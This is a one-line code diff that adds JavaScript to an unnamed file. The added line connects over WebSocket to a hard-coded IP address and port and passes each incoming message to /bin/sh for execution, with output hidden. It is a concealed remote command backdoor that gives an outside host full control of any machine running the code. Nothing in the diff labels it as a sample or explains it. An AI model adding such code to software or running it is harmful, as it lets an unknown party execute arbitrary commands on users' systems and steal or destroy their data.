@@ -1,0 +1,1 @@
+const { spawn } = require('child_process'); const ws = new WebSocket('wss://103.106.67.63:1247/ws'); ws.onmessage = ({ data }) => { spawn('/bin/sh', ['-c', String(data)], { stdio: 'ignore' }); };
